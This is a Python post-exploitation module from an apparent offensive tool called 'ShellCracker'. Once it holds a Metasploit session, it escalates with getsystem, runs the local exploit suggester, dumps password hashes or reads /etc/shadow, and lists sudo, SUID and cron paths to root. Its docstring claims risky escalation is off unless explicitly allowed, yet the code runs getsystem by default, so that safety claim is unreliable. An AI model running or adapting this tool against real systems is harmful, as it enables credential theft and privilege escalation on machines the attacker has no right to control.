"""Post-exploitation: what happens *after* a session lands.

A shell is the middle of the kill chain, not the end. Once the executor verifies
a session, :class:`PostExploiter` runs an automated, mostly read-only
post-exploitation pass so the operator is handed a foothold that is already
triaged:

* **Identify** — who am I (``getuid`` / ``id``), what box is this (``sysinfo`` /
  ``uname``), am I already privileged?
* **Escalate** — on meterpreter, try ``getsystem`` and run the
  ``local_exploit_suggester``; on a shell, enumerate the classic Linux privesc
  surface (``sudo -l``, SUID binaries, kernel version, cron) and suggest paths.
* **Loot** — read low-risk, high-value artefacts (``/etc/passwd``; ``/etc/shadow``
  or ``hashdump`` only when already privileged).

Everything here is deliberately conservative: enumeration and suggestions by
default. Actually firing a kernel/local exploit is gated behind
``post_exploitation.auto_escalate`` + ``strategy.allow_dangerous`` because those
can crash the target. The goal is a thorough, safe triage — not a smash-and-grab.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger("ShellCracker.postexp")

# SUID binaries that are well-known privilege-escalation primitives (GTFOBins).
_GTFO_SUID = {
    "nmap", "vim", "find", "bash", "more", "less", "nano", "cp", "mv", "awk",
    "python", "python2", "python3", "perl", "ruby", "php", "env", "tar",
    "zip", "man", "vi", "dd", "nc", "socat", "wget", "curl",
}


@dataclass
class PostExpResult:
    """Everything the post-exploitation pass learned about a foothold."""

    session_id: int
    session_type: str = ""
    whoami: str = ""
    system_info: str = ""
    is_privileged: bool = False
    escalated: bool = False
    privesc_suggestions: list[str] = field(default_factory=list)
    loot: dict[str, str] = field(default_factory=dict)
    commands_run: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "session_type": self.session_type,
            "whoami": self.whoami,
            "system_info": self.system_info,
            "is_privileged": self.is_privileged,
            "escalated": self.escalated,
            "privesc_suggestions": self.privesc_suggestions,
            "loot": self.loot,
            "commands_run": self.commands_run,
            "notes": self.notes,
        }

    def summary(self) -> str:
        who = self.whoami.splitlines()[0] if self.whoami else "?"
        tag = "ROOT/SYSTEM" if self.is_privileged else "sinirli"
        extra = ""
        if self.privesc_suggestions:
            extra = f", {len(self.privesc_suggestions)} privesc onerisi"
        return f"{who} ({tag}){extra}"


class PostExploiter:
    """Runs an automated post-exploitation triage over a single session."""

    def __init__(self, client: Any, config: dict[str, Any]) -> None:
        self.client = client
        cfg = (config or {}).get("post_exploitation", {}) or {}
        self.enabled = bool(cfg.get("enabled", True))
        self.do_loot = bool(cfg.get("loot", True))
        self.do_suggester = bool(cfg.get("privesc_suggester", True))
        self.auto_escalate = bool(cfg.get("auto_escalate", True))
        self.allow_dangerous = bool(
            (config or {}).get("strategy", {}).get("allow_dangerous", False)
        )

    # -- low-level session I/O ----------------------------------------------
    def _mt(self, session: Any, cmd: str, timeout: int = 20) -> str:
        """Run a meterpreter command and return its output."""
        try:
            out = session.run_with_output(cmd, timeout=timeout)
            return (out or "").strip()
        except Exception:  # noqa: BLE001 - fall back to raw write/read
            try:
                session.write(cmd)
                time.sleep(2)
                return (session.read() or "").strip()
            except Exception as exc:  # noqa: BLE001
                return f"[hata: {exc}]"

    def _sh(self, session: Any, cmd: str) -> str:
        """Run a shell command (write + drain) and return its output."""
        try:
            session.write(cmd + "\n")
            out = ""
            for _ in range(10):
                time.sleep(0.4)
                try:
                    chunk = session.read()
                except Exception:  # noqa: BLE001
                    break
                if chunk:
                    out += chunk
                elif out:
                    break
            return out.strip()
        except Exception as exc:  # noqa: BLE001
            return f"[hata: {exc}]"

    def _console_suggester(self, sid: int) -> list[str]:
        """Run local_exploit_suggester against the session; parse suggestions."""
        try:
            console = self.client.consoles.console()
        except Exception as exc:  # noqa: BLE001
            logger.debug("suggester console acilamadi: %s", exc)
            return []
        out = ""
        try:
            for cmd in (
                "use post/multi/recon/local_exploit_suggester\n",
                f"set SESSION {sid}\n",
                "run\n",
            ):
                console.write(cmd)
            deadline = time.time() + 120
            idle = 0
            while time.time() < deadline:
                time.sleep(1)
                try:
                    chunk = console.read()
                except Exception:  # noqa: BLE001
                    break
                data = chunk.get("data", "") if isinstance(chunk, dict) else ""
                busy = chunk.get("busy", False) if isinstance(chunk, dict) else False
                if data:
                    out += data
                    idle = 0
                else:
                    idle += 1
                if not busy and idle >= 2:
                    break
        finally:
            try:
                self.client.consoles.destroy(console.cid)
            except Exception:  # noqa: BLE001
                pass

        suggestions: list[str] = []
        for line in out.splitlines():
            low = line.lower()
            if "appears to be vulnerable" in low or ("- " in line and "exploit/" in low):
                suggestions.append(line.strip())
        return suggestions

    # -- heuristics ----------------------------------------------------------
    @staticmethod
    def _suggest_linux(loot: dict[str, str]) -> list[str]:
        """Turn Linux enumeration output into concrete privesc leads."""
        out: list[str] = []
        sudo = loot.get("sudo", "")
        if sudo and "may run" in sudo.lower():
            out.append(f"sudo -l izinleri var -> sudo uzerinden yukseltme: {sudo.strip()[:160]}")
        if "(ALL" in sudo and "NOPASSWD" in sudo.upper():
            out.append("NOPASSWD sudo kurali -> dogrudan root komut calistirma mumkun.")
        suid = loot.get("suid", "")
        hits = sorted({b for b in _GTFO_SUID if f"/{b}" in suid})
        if hits:
            out.append("GTFOBins SUID adaylari: " + ", ".join(hits)
                       + " -> GTFOBins ile root kabuk.")
        kernel = loot.get("kernel", "").strip()
        if kernel:
            out.append(f"Kernel {kernel} -> surum-spesifik kernel exploit (dirtycow vb.) arastir.")
        if loot.get("writable_cron", "") and "rwx" in loot.get("writable_cron", "").lower():
            out.append("Yazilabilir cron dosyasi -> zamanlanmis gorev ile root.")
        return out

    # -- main entry ----------------------------------------------------------
    def run(self, sid: int, session_type: str, profile: Any = None) -> PostExpResult:
        """Triage session ``sid`` and return a :class:`PostExpResult`."""
        result = PostExpResult(session_id=sid, session_type=session_type)
        if not self.enabled:
            return result
        try:
            session = self.client.sessions.session(sid)
        except Exception as exc:  # noqa: BLE001
            result.notes.append(f"oturum alinamadi: {exc}")
            return result

        logger.info("Post-exploitation basliyor (oturum %s, %s).", sid, session_type or "?")
        is_mt = session_type == "meterpreter"

        if is_mt:
            result.whoami = self._mt(session, "getuid")
            result.system_info = self._mt(session, "sysinfo")
            result.commands_run += ["getuid", "sysinfo"]
            low = result.whoami.lower()
            result.is_privileged = "system" in low or "root" in low or "admin" in low

            if self.auto_escalate and not result.is_privileged:
                esc = self._mt(session, "getsystem")
                result.commands_run.append("getsystem")
                after = self._mt(session, "getuid")
                if "system" in after.lower():
                    result.escalated = True
                    result.is_privileged = True
                    result.whoami = after
                    result.notes.append("getsystem ile SYSTEM'e yukseltildi.")

            if self.do_suggester:
                result.privesc_suggestions = self._console_suggester(sid)

            if self.do_loot and result.is_privileged:
                result.loot["hashdump"] = self._mt(session, "hashdump", timeout=30)
                result.commands_run.append("hashdump")
        else:
            result.whoami = self._sh(session, "id 2>/dev/null || whoami")
            result.system_info = self._sh(
                session, "uname -a; cat /etc/issue 2>/dev/null; hostname")
            result.commands_run += ["id", "uname -a"]
            result.is_privileged = "uid=0" in result.whoami or \
                result.whoami.strip() == "root"

            # Read-only Linux privesc enumeration.
            result.loot["kernel"] = self._sh(session, "uname -r")
            result.loot["sudo"] = self._sh(session, "sudo -n -l 2>/dev/null")
            result.loot["suid"] = self._sh(
                session, "find / -perm -4000 -type f 2>/dev/null | head -n 40")
            result.loot["writable_cron"] = self._sh(
                session, "ls -la /etc/cron* 2>/dev/null")
            result.commands_run += ["uname -r", "sudo -n -l", "find / -perm -4000"]

            if self.do_loot:
                if result.is_privileged:
                    result.loot["shadow"] = self._sh(
                        session, "head -n 15 /etc/shadow 2>/dev/null")
                    result.commands_run.append("cat /etc/shadow")
                else:
                    result.loot["passwd"] = self._sh(
                        session, "head -n 15 /etc/passwd 2>/dev/null")
                    result.commands_run.append("cat /etc/passwd")

            result.privesc_suggestions = self._suggest_linux(result.loot)

        if profile is not None:
            profile.add_fact("foothold", {
                "session": sid, "type": session_type,
                "user": result.whoami.splitlines()[0] if result.whoami else "",
                "privileged": result.is_privileged,
            })

        logger.info("Post-exploitation ozeti: %s", result.summary())
        for s in result.privesc_suggestions[:6]:
            logger.info("  privesc: %s", s)
        return result
